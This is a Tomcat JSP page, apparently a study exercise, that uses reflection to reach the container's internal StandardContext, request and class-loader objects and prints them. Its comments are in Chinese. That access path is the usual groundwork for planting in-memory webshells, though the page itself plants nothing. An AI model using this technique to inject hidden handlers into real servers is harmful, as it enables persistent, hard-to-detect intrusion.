<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.loader.WebappClassLoaderBase" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<html>
<body>
<h2>Hello World!!!</h2>
<p>
<% String name = "枫"; %>
用户名：<%=name%>

</p>




<%
   //获取ApplicationContextFacade类
   ServletContext servletContext = request.getSession().getServletContext();

//反射获取ApplicationContextFacade类属性context为ApplicationContext类
   Field appContextField = servletContext.getClass().getDeclaredField("context");
   appContextField.setAccessible(true);
   ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);

//反射获取ApplicationContext类属性context为StandardContext类
   Field standardContextField = applicationContext.getClass().getDeclaredField("context");
   standardContextField.setAccessible(true);
   StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
   out.println(standardContext);
%>
<br>
<%
   out.println(request);
%>
<br>
<%
   Field reqF = request.getClass().getDeclaredField("request");
   reqF.setAccessible(true);
   Request req = (Request) reqF.get(request);
   out.println(req.getContext());
%>
<br>
<%
   WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
   out.println(webappClassLoaderBase);
//   StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
%>



</body>
</html>
